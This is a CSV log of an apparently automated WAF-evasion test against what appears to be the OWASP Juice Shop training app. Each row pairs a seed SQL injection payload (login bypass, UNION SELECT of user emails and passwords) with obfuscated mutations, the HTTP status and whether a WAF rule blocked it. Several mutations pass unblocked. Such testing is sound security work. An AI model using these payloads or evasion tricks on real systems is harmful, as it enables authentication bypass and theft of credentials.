wave_id,payload_id,attack_type,seed_payload,mutated_payload,endpoint,status_code,blocked,matched_rule_id,timestamp
1,w1-sqli-01-1,sqli,' OR 1=1--, OR 1=1 --,/rest/user/login,401,False,,2026-08-10T20:18:41.917262+00:00
1,w1-sqli-01-2,sqli,' OR 1=1--,or 1 =1; --,/rest/user/login,401,False,,2026-08-10T20:18:42.074445+00:00
1,w1-sqli-01-3,sqli,' OR 1=1--,or'1'='1'; #,/rest/user/login,500,False,,2026-08-10T20:18:42.118284+00:00
1,w1-sqli-01-4,sqli,' OR 1=1--,or/**/1=1;#,/rest/user/login,401,False,,2026-08-10T20:18:42.198694+00:00
1,w1-sqli-02-1,sqli,' OR '1'='1, OR /* */ '1'='1,/rest/user/login,500,False,,2026-08-10T20:18:42.257485+00:00
1,w1-sqli-02-2,sqli,' OR '1'='1, or 1=1 -- ,/rest/user/login,401,False,,2026-08-10T20:18:42.280342+00:00
1,w1-sqli-02-3,sqli,' OR '1'='1,' || unhex('310c7a756e')='1,/rest/user/login,403,True,949110,2026-08-10T20:18:42.313708+00:00
1,w1-sqli-02-4,sqli,' OR '1'='1,' || %u31%0c%75%6e%68%65%78%2d%27%3d%31,/rest/user/login,500,False,,2026-08-10T20:18:42.320436+00:00
1,w1-sqli-03-1,sqli,admin@juice-sh.op'--,admin@juice-sh.op'--;,/rest/user/login,200,False,,2026-08-10T20:18:42.342405+00:00
1,w1-sqli-03-2,sqli,admin@juice-sh.op'--,"aDmIn@JuIcE-S.hOp"";--",/rest/user/login,403,True,949110,2026-08-10T20:18:42.385613+00:00
1,w1-sqli-03-3,sqli,admin@juice-sh.op'--,%61dmin%40jUicE-7h0p%27;--,/rest/user/login,403,True,949110,2026-08-10T20:18:42.390590+00:00
1,w1-sqli-03-4,sqli,admin@juice-sh.op'--,ADMIN@iuce-Sh0p';--,/rest/user/login,403,True,949110,2026-08-10T20:18:42.395730+00:00
1,w1-sqli-04-1,sqli,') OR ('1'='1,)%20OR%20%28%27%31%27=%271,/rest/user/login,401,False,,2026-08-10T20:18:42.403475+00:00
1,w1-sqli-04-2,sqli,') OR ('1'='1,'' or (1=1),/rest/user/login,403,True,949110,2026-08-10T20:18:42.422535+00:00
1,w1-sqli-04-3,sqli,') OR ('1'='1,'\) OR (1=1),/rest/user/login,403,True,949110,2026-08-10T20:18:42.426938+00:00
1,w1-sqli-04-4,sqli,') OR ('1'='1,') OR (1=(SELECT * FROM information_schema.Variables WHERE VARIABLE_NAME = 'one')),/rest/user/login,403,True,949110,2026-08-10T20:18:42.431744+00:00
1,w1-sqli-05-1,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",[,/rest/products/search,200,False,,2026-08-10T20:18:42.438212+00:00
1,w1-sqli-05-2,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' union select id,email,password,'1','1','1','1','1' from users--"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.455389+00:00
1,w1-sqli-05-3,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","UNION SELECT id, email, password, '1', '1', '1', '1', '1' FROM users --"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.460124+00:00
1,w1-sqli-05-4,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x' UNION SELECT id,email,password,\\""1\\"",\\""1\\"",\\""1\\"",\\""1\\"",\\""1\\"" FROM Users--"",",/rest/products/search,403,True,949110,2026-08-10T20:18:42.465252+00:00
1,w1-sqli-05-5,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--","x'//** union select id,email,password,'1','1','1','1','1' from Users//",/rest/products/search,403,True,949110,2026-08-10T20:18:42.471286+00:00
1,w1-sqli-05-6,sqli,"x' UNION SELECT id,email,password,'1','1','1','1','1' FROM Users--",],/rest/products/search,200,False,,2026-08-10T20:18:42.475823+00:00
